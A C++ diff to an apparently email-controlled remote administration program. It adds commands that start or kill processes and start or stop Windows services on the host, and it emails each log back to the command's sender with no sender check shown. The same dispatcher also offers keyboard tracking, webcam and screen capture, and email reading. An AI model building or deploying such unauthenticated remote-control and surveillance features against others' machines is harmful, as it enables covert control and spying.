@@ -96,6 +96,14 @@ void ServerManager::handleCommand(const Json::Value& command) {
             handleProcessListCommand(command);
             return; 
         }
+		else if (this->currentCommand.content == "startProcess") {
+			handleStartProcess(command);
+			return;
+		}
+        else if (this->currentCommand.content == "endProcess") {
+            handleEndProcess(command);
+            return;
+        }
         else if (this->currentCommand.content == "readRecentEmails") {
             handleReadRecentEmailsCommand(command);
             return;
@@ -104,15 +112,8 @@ void ServerManager::handleCommand(const Json::Value& command) {
             handleCaptureScreen(command);
             return;
         }
-        else if (this->currentCommand.content == "recordScreen") {
-            return;
-        }
         else if (this->currentCommand.content == "captureWebcam") {
             handleCaptureWebcam(command);
-            return;
-        }
-        else if (this->currentCommand.content == "recordWebcam") {
-            handleRecordWebcam(command);
             return;
         }
         else if (this->currentCommand.content == "trackKeyboard") {
@@ -121,6 +122,14 @@ void ServerManager::handleCommand(const Json::Value& command) {
         }
         else if (this->currentCommand.content == "listService") {
             handleListService(command);
+            return;
+        }
+        else if (this->currentCommand.content == "startService") {
+            handleStartService(command);
+            return;
+        }
+        else if (this->currentCommand.content == "endService") {
+			handleEndService(command);
             return;
         }
         else if (this->currentCommand.content == "listFile") {
@@ -231,6 +240,82 @@ void ServerManager::handleProcessListCommand(const Json::Value& command) {
     else {
         cout << "Failed to send process list via email" << endl;
 		this->currentCommand.message = "Failed to send process list via email";
+    }
+}
+
+void ServerManager::handleStartProcess(const Json::Value& command) {
+    cout << "Handling start process command..." << endl;
+
+    // Get sender email
+    this->currentCommand.from = command["From"].asString();
+    cout << "Sender email: " << this->currentCommand.from << endl;
+
+    // Get process names from content
+    vector<string> processesToStart;
+    string content = command["Content"].asString();
+
+    // Split content by spaces
+    istringstream iss(content);
+    string process;
+    while (iss >> process) {
+        processesToStart.push_back(process);
+    }
+
+    // Generate log filename
+    string logFileName = "D:\\process_start_" + to_string(time(nullptr)) + ".txt";
+
+    // Start processes and log results
+    RunningApps::startAppsFromShortcuts(processesToStart, logFileName);
+
+    // Send email with results
+    string subject = "Process Start Results";
+    string body = "Process start operation log attached.";
+
+    if (gmail.sendEmail(this->currentCommand.from, subject, body, logFileName)) {
+        cout << "Start operation results sent successfully via email" << endl;
+        this->currentCommand.message = "Start operation results sent successfully";
+    }
+    else {
+        cout << "Failed to send start operation results via email" << endl;
+        this->currentCommand.message = "Failed to send start operation results";
+    }
+}
+
+void ServerManager::handleEndProcess(const Json::Value& command) {
+    cout << "Handling end process command..." << endl;
+
+    // Get sender email
+    this->currentCommand.from = command["From"].asString();
+    cout << "Sender email: " << this->currentCommand.from << endl;
+
+    // Get process names from content
+    vector<string> processesToEnd;
+    string content = command["Content"].asString();
+
+    // Split content by spaces
+    istringstream iss(content);
+    string process;
+    while (iss >> process) {
+        processesToEnd.push_back(process);
+    }
+
+    // Generate log filename
+    string logFileName = "D:\\process_end_" + to_string(time(nullptr)) + ".txt";
+
+    // End processes and log results
+    RunningApps::endSelectedTasks(processesToEnd, logFileName);
+
+    // Send email with results
+    string subject = "Process Termination";
+    string body = "Process termination log attached.";
+
+    if (gmail.sendEmail(this->currentCommand.from, subject, body, logFileName)) {
+        cout << "Termination results sent successfully via email" << endl;
+        this->currentCommand.message = "Termination results sent successfully";
+    }
+    else {
+        cout << "Failed to send termination results via email" << endl;
+        this->currentCommand.message = "Failed to send termination results";
     }
 }
 
@@ -433,6 +518,84 @@ void ServerManager::handleListService(const Json::Value& command) {
     else {
         cout << "Failed to send screen capture via email" << endl;
 		this->currentCommand.message += "\nFailed to send screen capture via email";
+    }
+}
+
+void ServerManager::handleStartService(const Json::Value& command) {
+    cout << "Handling start service command..." << endl;
+
+    // Get sender email
+    this->currentCommand.from = command["From"].asString();
+    cout << "Sender email: " << this->currentCommand.from << endl;
+
+    // Get service names from content
+    vector<string> servicesToStart;
+    string content = command["Content"].asString();
+
+    // Split content by spaces
+    istringstream iss(content);
+    string service;
+    while (iss >> service) {
+        servicesToStart.push_back(service);
+    }
+
+    // Generate log filename
+    string logFileName = "D:\\service_start_" + to_string(time(nullptr)) + ".txt";
+
+    // Start services and log results
+    ServiceList serviceList;
+    serviceList.startService(servicesToStart, logFileName);
+
+    // Send email with results
+    string subject = "Service Start Results";
+    string body = "Service start operation log attached.";
+
+    if (gmail.sendEmail(this->currentCommand.from, subject, body, logFileName)) {
+        cout << "Service start results sent successfully via email" << endl;
+        this->currentCommand.message = "Service start results sent successfully";
+    }
+    else {
+        cout << "Failed to send service start results via email" << endl;
+        this->currentCommand.message = "Failed to send service start results";
+    }
+}
+
+void ServerManager::handleEndService(const Json::Value& command) {
+    cout << "Handling stop service command..." << endl;
+
+    // Get sender email
+    this->currentCommand.from = command["From"].asString();
+    cout << "Sender email: " << this->currentCommand.from << endl;
+
+    // Get service names from content
+    vector<string> servicesToStop;
+    string content = command["Content"].asString();
+
+    // Split content by spaces
+    istringstream iss(content);
+    string service;
+    while (iss >> service) {
+        servicesToStop.push_back(service);
+    }
+
+    // Generate log filename
+    string logFileName = "D:\\service_stop_" + to_string(time(nullptr)) + ".txt";
+
+    // Stop services and log results
+    ServiceList serviceList;
+    serviceList.stopService(servicesToStop, logFileName);
+
+    // Send email with results
+    string subject = "Service Stop Results";
+    string body = "Service stop operation log attached.";
+
+    if (gmail.sendEmail(this->currentCommand.from, subject, body, logFileName)) {
+        cout << "Service stop results sent successfully via email" << endl;
+        this->currentCommand.message = "Service stop results sent successfully";
+    }
+    else {
+        cout << "Failed to send service stop results via email" << endl;
+        this->currentCommand.message = "Failed to send service stop results";
     }
 }
 
